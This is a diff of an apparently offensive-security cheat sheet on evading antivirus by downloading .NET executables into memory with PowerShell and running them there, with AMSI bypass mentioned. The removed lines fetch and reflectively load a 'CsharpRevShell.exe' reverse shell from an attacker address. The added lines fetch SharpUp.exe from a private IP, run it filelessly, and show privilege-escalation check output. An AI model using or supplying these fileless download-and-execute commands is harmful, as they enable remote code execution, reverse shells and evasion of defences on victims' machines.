@@ -186,19 +186,25 @@ In addtion, below are some examples of PowerShell commands that allow to manuall
 and PowerShell scripts.
 Keep in mind that to avoid AV detection it will necessary to bypass the AMSI (Refer to the next section).
 
+
 2.1.1 Manually download and execute a .Net PE straight into memory using PowerShell
 -------------------------------------------------------------------------------------------
 
-PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/CsharpRevShell.exe')
-PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
-PS C:\temp> [CsharpRevShell.Program]::Main("".Split())
+PoC with the tool "SharUP.exe" (C# - SharpUp.csproj)
 
-OR
+PS C:\temp> $PEtoload = (New-Object System.Net.WebClient).DownloadData('http://192.168.13.154:8081/SharpUp.exe')
+PS C:\temp> $assembly = [System.Reflection.Assembly]::Load($PEtoload);
+PS C:\temp> $entryPointMethod = $assembly.GetType('SharpUp.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
+PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('audit', '')));
 
-PS C:\temp> $bytes = (Invoke-WebRequest "http://YOUR_IP_ADDRESS/CsharpRevShell.exe").Content;
-PS C:\temp> $assembly = [System.Reflection.Assembly]::Load($bytes);
-PS C:\temp> $entryPointMethod = $assembly.GetType('ProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
-PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('', '')));
+=== SharpUp: Running Privilege Escalation Checks ===
+
+[*] Already in high integrity, no need to privesc!
+[*] Audit mode: running an additional 0 check(s).
+[*] Note: Running audit mode in high integrity will yield a large number of false positives.
+[-] Not vulnerable to any of the 0 checked modules.
+
+[*] Completed Privesc Checks in 0 seconds
 
 
 2.1.2 Manually download and execute a .NET DLL straight into memory using PowerShell
